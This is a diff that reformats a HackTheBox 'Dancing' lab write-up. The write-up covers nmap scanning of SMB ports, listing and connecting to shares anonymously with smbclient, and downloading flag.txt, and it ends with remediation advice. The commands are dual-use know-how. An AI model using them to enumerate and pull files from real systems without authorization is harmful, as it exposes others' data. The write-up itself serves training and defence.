@@ -1,93 +1,87 @@
-HackTheBox — Dancing (Starting Point) — Writeup
+# HackTheBox — Dancing (Starting Point) — Writeup
 
-Author: Janhavi Mohite
-Machine: Dancing (Starting Point)
-Date: 2025-09-20
-IP - 10.129.132.65
+**Author:** Janhavi Mohite  
+**Machine:** Dancing (Starting Point)  
+**Date:** 2025-09-20
 
-Objective
+---
 
-Retrieve the user flag from the target machine <TARGET_IP> using allowed enumeration and exploitation techniques. This was a beginner-friendly starting point focused on SMB enumeration and anonymous access.
+## Objective
 
-Environment
+Retrieve the user flag from the target machine `<TARGET_IP>` using allowed enumeration techniques. This was a beginner-friendly starting point focused on SMB enumeration and anonymous access.
 
-Attacking host: Kali/Parrot machine inside HTB VPN (example IP: 10.10.15.20)
+---
 
-Target host: <TARGET_IP>
+## Environment
 
-Tools used: nmap, smbclient, smbmap (optional), standard shell utilities (cat, ls)
+* Attacking host: Kali/Parrot machine inside HTB VPN (example IP: `10.10.15.20`)  
+* Target host: `<TARGET_IP>`  
+* Tools used: `nmap`, `smbclient`, `smbmap` (optional), standard shell utilities (`cat`, `ls`)
 
-Summary of steps
+---
 
-Performed service enumeration with nmap.
+## Summary of steps
 
-Enumerated SMB shares with smbclient -L.
+1. Performed service enumeration with `nmap`.  
+2. Enumerated SMB shares with `smbclient -L`.  
+3. Connected anonymously to the `workshare` share.  
+4. Navigated directories, downloaded `flag.txt` using `get`, and read the flag locally.
 
-Connected anonymously to the workshare share.
+---
 
-Navigated directories, downloaded flag.txt using get, and read the flag locally.
+## Reconnaissance
 
-Reconnaissance
-Nmap scan
+### Nmap scan
 
-I ran targeted nmap scans to find open SMB ports and services:
+I ran a targeted nmap scan to identify SMB-related services:
 
-# quick service scan (only SMB related ports)
+```bash
 nmap -sV -p 139,445 <TARGET_IP>
-
-# or a more aggressive scan for full service/version & scripts
 nmap -sV -sC -p- <TARGET_IP>
+```
 
+# Key findings:
 
-Key findings:
+Port 445/tcp — microsoft-ds (SMB) detected.
 
-Port 445/tcp — microsoft-ds (SMB) often shows up in nmap -sV.
+# Enumerating SMB
+List available shares (attempt anonymous access first):
 
-(If present) NetBIOS ports 137–139 may also be seen on older systems.
-
-(See nmap.png for a screenshot of the nmap output if you captured one.)
-
-Enumerating SMB
-
-List available shares (try anonymous access first):
-
+```bash
 smbclient -L //<TARGET_IP> -N
-
-
+```
 -L lists shares on the host.
+-N attempts anonymous login (no password prompt).
 
--N tells smbclient not to prompt for a password (attempt anonymous).
+From the output I found a share named workshare (may appear as workshares on some boxes). I connected to it anonymously:
 
-From the output I found a share named workshare (or workshares depending on output). I connected to it anonymously:
-
+```bash
 smbclient //<TARGET_IP>/workshare -N
-
-
-After connection I saw two directories inside the share. One of those directories contained flag.txt.
+```
+After connecting I observed two directories inside the share. One directory contained flag.txt.
 
 Downloading the flag
-
 At the smb: prompt:
-
+```bash
+text
 smb: \> ls
 smb: \> cd <directory-containing-flag>
 smb: \> get flag.txt
 smb: \> exit
-
-
-The get command downloads files from the SMB share to your local working directory.
+```
+The get command downloads files from the SMB share into your current working directory.
 
 Reading the flag
-
 On the attacking machine:
 
+```bash
 ls -la
 cat flag.txt
-
-
-The flag printed to the terminal and completes the user objective.
+```
+The file printed the user flag which completes the objective for this machine.
 
 Commands used (compact)
+```bash
 nmap -sV -p 139,445 <TARGET_IP>
 smbclient -L //<TARGET_IP> -N
 smbclient //<TARGET_IP>/workshare -N
@@ -96,21 +90,37 @@ smbclient //<TARGET_IP>/workshare -N
 #    cd <dir>
 #    get flag.txt
 #    exit
-# locally
+# locally:
 ls -la
 cat flag.txt
+```
 
+## Observations & Notes
+SMB stands for Server Message Block and modern SMB typically runs over TCP 445.
 
-If you prefer a quick share-permission view:
+smbclient -L //<IP> -N is useful to quickly discover which shares allow anonymous access.
 
-smbmap -H <TARGET_IP>
+Inside the SMB shell, get downloads a file and put uploads a file.
 
-Observations & Notes
+Only access systems you are authorized to test (HTB/CTF only).
 
-SMB (Server Message Block) is the service used for Windows file sharing — most modern SMB runs over TCP 445.
+Remediation advice (for real systems)
+Disable anonymous/guest SMB access unless explicitly required.
 
-smbclient -L //<IP> -N is very useful to quickly see which shares allow anonymous access.
+Restrict share contents and permissions to necessary users only.
 
-The get command in the SMB shell downloads files; put uploads.
+Monitor SMB logs for unusual access and keep services patched.
 
-Always ensure you only test machines you are authorized to (HTB/CTF boxes are safe to practice on).
+Prefer secure alternatives for remote file transfer (SFTP/FTPS) when possible.
+
+References / Credits
+HackTheBox — Starting Point: Dancing
+
+Tools: nmap, smbclient,
+
+## Conclusion
+
+The Dancing box highlighted the risks of misconfigured SMB shares that allow anonymous access.  
+By enumerating SMB services with `nmap`, discovering shares with `smbclient -L`, and connecting anonymously, I was able to navigate to the `workshare` share and retrieve the `flag.txt` file.  
+
+This reinforces the importance of proper share permissions, disabling guest/anonymous access, and regularly auditing network services for insecure defaults.
